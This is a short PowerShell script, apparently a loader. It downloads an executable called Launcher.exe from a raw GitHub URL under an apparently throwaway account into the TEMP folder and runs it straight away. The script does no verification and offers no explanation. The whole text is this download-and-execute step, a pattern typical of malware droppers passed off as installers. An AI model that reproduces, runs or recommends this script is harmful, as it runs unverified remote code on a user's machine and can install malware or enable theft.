$exeUrl = "https://raw.githubusercontent.com/v25888656-maker/installer/refs/heads/main/Launcher.exe"
$exePath = "$env:TEMP\Launcher.exe"
irm -Uri $exeUrl -OutFile $exePath
Start-Process -FilePath $exePath -NoNewWindow
